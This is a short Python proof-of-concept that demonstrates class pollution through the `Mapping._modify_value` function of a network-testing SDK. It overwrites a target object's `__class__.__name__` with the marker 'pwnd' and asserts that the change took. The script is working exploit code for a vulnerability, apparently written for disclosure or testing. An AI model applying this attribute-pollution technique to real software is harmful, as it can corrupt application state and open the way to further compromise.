# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Mapping._modify_value
# Type: get-attr-set-attr

from genie.libs.sdk.libs.utils.mapping import Mapping

class Target: pass
target = Target()

mapping = Mapping()

payload_value = "pwnd"
PAYLOAD = ["__class__", "__name__"]

def run_poc():
  mapping._modify_value(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
